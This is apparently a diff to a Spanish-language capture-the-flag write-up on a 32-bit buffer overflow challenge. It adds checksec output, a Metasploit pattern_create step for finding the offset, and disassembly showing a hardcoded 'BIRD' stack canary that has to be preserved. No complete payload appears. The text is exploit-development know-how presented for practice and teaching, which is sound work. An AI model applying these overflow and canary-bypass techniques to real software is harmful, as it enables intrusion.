@@ -15,8 +15,18 @@ Se trata del clásico buffer overflow que peta cuando le metes más caracteres d
  > AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
 Segmentation fault
 ```
+Veamos las protecciones que tiene el binario:
 
-Vamos a crear un patrón de caracteres para averiguar el offset con metasploit:
+```
+gdb-peda$ checksec 
+CANARY    : disabled
+FORTIFY   : disabled
+NX        : ENABLED
+PIE       : disabled
+RELRO     : Partial
+```
+
+Sólo tiene habilitado lal no ejecucción en la pila, vamos a crear un patrón de caracteres para averiguar el offset con metasploit:
 
 ```
 /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 150
@@ -33,7 +43,7 @@ Lo metemos en gdb y nos da una dirección que se corresponde con una parte del p
 Si nos fijamos en la función main vemos que hay una llamada a la función que recoge nuestros datos por consola, esta función es vulnerable a un buffer overflow. Si metemos más de 140 caracteres vamos a sobreescribir el stack frame de main.
 
 ```
-08049790 <main>:
+ 08049790 <main>:
  8049790:	55                   	push   ebp
  8049791:	89 e5                	mov    ebp,esp
  8049793:	81 ec a8 00 00 00    	sub    esp,0xa8
@@ -129,7 +139,54 @@ Continuing.
   ~(‾▿‾)~   Oh NO! We hate birds :( 
 ```
 
-Ooops! Something is wrong here. ¿Qué ha pasado? Parece que no era tan fácil como parecía. Si echamos un vistazo detenidamente a la función "_Z6CARROTv" podemos ver lo siguiente:
+Ooops! Something is wrong here. ¿Qué ha pasado? Parece que no era tan fácil como parecía. Echemos un vistazo a la función "_Z6CARROTv" a ver si encontramos algo:
+
+```
+ 8049575:	81 ec 90 00 00 00    	sub    esp,0x90
+ 804957b:	8d 05 d5 9f 04 08    	lea    eax,ds:0x8049fd5
+ 8049581:	89 04 24             	mov    DWORD PTR [esp],eax
+ 8049584:	e8 d7 f9 ff ff       	call   8048f60 <printf@plt>
+ 8049589:	81 3d d4 c1 04 08 44 52 49 42 	cmp    DWORD PTR ds:0x804c1d4,0x42495244    <= Compara el contenido de una posición de memoria con el valor 0x42495244
+ 8049593:	89 45 a8             	mov    DWORD PTR [ebp-0x58],eax
+ 8049596:	0f 84 22 00 00 00    	je     80495be <_Z6CARROTv+0x4e>
+ 804959c:	8d 05 fb 9f 04 08    	lea    eax,ds:0x8049ffb
+ 80495a2:	89 04 24             	mov    DWORD PTR [esp],eax
+ 80495a5:	e8 b6 f9 ff ff       	call   8048f60 <printf@plt>
+ 80495aa:	31 c9                	xor    ecx,ecx
+ 80495ac:	c7 04 24 00 00 00 00 	mov    DWORD PTR [esp],0x0
+ 80495b3:	89 45 a4             	mov    DWORD PTR [ebp-0x5c],eax
+ 80495b6:	89 4d a0             	mov    DWORD PTR [ebp-0x60],ecx
+ 80495b9:	e8 e2 fa ff ff       	call   80490a0 <exit@plt>
+ 80495be:	a1 d8 c1 04 08       	mov    eax,ds:0x804c1d8
+```
+
+Tenemos una comparación entre el valor 0x42495244 (que en ASCII es 'BIRD", ¡son unos cachondos dando pistas!)  y la posición de memoria 0x804c1d4, que es la variable 'c1' y contiene lo siguiente:
+
+```
+x/32xw 0x804c1d4
+0x804c1d4 <c1>:	0x41414141	0xb7c24200	0x00000000	0x00000000
+```
+Mmm... no creo que sea casualidad que haya 'AAAA' en esa posición de memoria. Sospecho que en la función main guarda un valor en esa posición de memoria para asegurarse que nadie modifica la pila. Lo que se conoce como el canary stack, pero debe ser un canary hardcodeado en el propio código porque antes hemos visto que no estaba habilitado esa protección en el binario. Volvamos a la función main y veamos cuando guarda ese valor y como podemos saltarnos el canary hardcodeado:
+
+```
+ 08049790 <main>:
+ 8049790:	55                   	push   ebp
+ 8049791:	89 e5                	mov    ebp,esp
+ 8049793:	81 ec a8 00 00 00    	sub    esp,0xa8
+ 8049799:	c7 45 fc 44 52 49 42 	mov    DWORD PTR [ebp-0x4],0x42495244
+ 80497a0:	c7 45 f8 00 00 00 00 	mov    DWORD PTR [ebp-0x8],0x0
+ ...........
+ 80497ff:	31 c0                	xor    eax,eax
+ 8049801:	8b 4d f8             	mov    ecx,DWORD PTR [ebp-0x8]          
+ 8049804:	89 0d d0 c1 04 08    	mov    DWORD PTR ds:0x804c1d0,ecx    
+ 804980a:	8b 4d fc             	mov    ecx,DWORD PTR [ebp-0x4]
+ 804980d:	89 0d d4 c1 04 08    	mov    DWORD PTR ds:0x804c1d4,ecx
+ 8049813:	8b 4d 04             	mov    ecx,DWORD PTR [ebp+0x4]
+ 8049816:	89 0d d8 c1 04 08    	mov    DWORD PTR ds:0x804c1d8,ecx
+ 804981c:	81 c4 a8 00 00 00    	add    esp,0xa8
+ 8049822:	5d                   	pop    ebp
+ 8049823:	c3                   	ret                                   
+```
 
 
 ```
